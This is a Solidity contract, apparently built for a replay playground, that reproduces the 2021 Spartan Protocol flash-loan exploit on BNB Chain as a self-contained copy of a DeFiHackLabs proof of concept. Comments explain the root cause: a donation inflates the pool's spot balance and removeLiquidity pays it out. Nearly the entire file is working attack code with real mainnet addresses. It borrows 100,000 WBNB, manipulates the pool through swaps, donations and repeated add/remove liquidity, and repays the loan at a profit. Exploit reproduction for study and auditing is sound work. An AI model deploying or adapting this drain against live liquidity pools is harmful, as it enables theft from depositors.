// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Synthetic standalone exploit for the EVM Playground (2021-05-Spartan).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the pancakeCall flash-swap callback is on the `Exploit is Test` contract
// itself, so there is no standalone contract to deploy). This file is a
// faithful, self-contained copy of that inline attack (testExploit body → run;
// the pancakeCall callback preserved verbatim), compiled inside the registry
// forge project so the playground can deploy + record it. Logic, constants and
// loop counts are copied verbatim from test/Spartan_exp.sol.
//
// Root cause: Spartan's Pool mints LP units against STORED reserves but burns
// them against SPOT balanceOf(pool), which any caller can inflate by a bare
// transfer ("donation"); removeLiquidity() never sync()s the donation into the
// stored reserves first, so the donated tokens are paid straight back to the
// redeemer. Net for one cycle: ~1,026.71 WBNB.

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

interface ISpartanPool {
    function swapTo(address token, address member) external payable returns (uint256 outputAmount, uint256 fee);
    function addLiquidity() external returns (uint256 liquidityUnits);
    function removeLiquidity() external returns (uint256 outputBase, uint256 outputToken);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract SpartanDrain {
    IWBNB private constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant SPARTA = IERC20(0xE4Ae305ebE1AbE663f261Bc00534067C80ad677C);

    IUniswapV2Pair private constant CAKE_WBNB = IUniswapV2Pair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    ISpartanPool private constant SPT1_WBNB = ISpartanPool(0x3de669c4F1f167a8aFBc9993E4753b84b576426f); // SPARTA<>WBNB

    // entrypoint: kick off the 100k WBNB flash loan from the CAKE/WBNB pair.
    function run() external {
        CAKE_WBNB.swap(0, 100_000 ether, address(this), "flashloan 100k WBNB");
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        // 1: swap WBNB for SPARTA 4 times
        for (uint256 i; i < 4; ++i) {
            WBNB.transfer(address(SPT1_WBNB), 1913.17 ether);
            SPT1_WBNB.swapTo(address(SPARTA), address(this));
        }

        // 2: addLiquidity SPARTA<>WBNB, get LP tokens (priced on STORED reserves)
        SPARTA.transfer(address(SPT1_WBNB), SPARTA.balanceOf(address(this)));
        WBNB.transfer(address(SPT1_WBNB), 11_853.33 ether);
        SPT1_WBNB.addLiquidity();

        // 3: swap WBNB for SPARTA 9 times (more in this step for less slippage)
        for (uint256 i; i < 9; ++i) {
            WBNB.transfer(address(SPT1_WBNB), 1674.02 ether);
            SPT1_WBNB.swapTo(address(SPARTA), address(this));
        }

        // 4: donate WBNB + SPARTA to the pool (no sync — inflates spot balanceOf)
        SPARTA.transfer(address(SPT1_WBNB), SPARTA.balanceOf(address(this)));
        WBNB.transfer(address(SPT1_WBNB), 21_632.14 ether);

        // 5: removeLiquidity from step 2. Pool uses spot balanceOf() to calculate
        //    withdraw amounts, so we withdraw more than normal. removeLiquidity()
        //    doesn't sync the donated spot balances into reserves first.
        SPT1_WBNB.transfer(address(SPT1_WBNB), SPT1_WBNB.balanceOf(address(this)));
        SPT1_WBNB.removeLiquidity();

        // 6: immediately addLiquidity to "recover" donated tokens from step 4
        SPT1_WBNB.addLiquidity();

        // 7: removeLiquidity again to get all assets (with exploited profits) out
        IERC20(address(SPT1_WBNB)).transfer(address(SPT1_WBNB), IERC20(address(SPT1_WBNB)).balanceOf(address(this)));
        SPT1_WBNB.removeLiquidity();

        // 8: swap SPARTA back to WBNB
        uint256 swapAmount = SPARTA.balanceOf(address(this)) / 10;
        for (uint256 i; i < 9; ++i) {
            SPARTA.transfer(address(SPT1_WBNB), swapAmount);
            SPT1_WBNB.swapTo(address(WBNB), address(this));
        }

        // repay the flash loan (0.3% fee)
        WBNB.transfer(address(CAKE_WBNB), amount1 * 1000 / 997);
    }
}
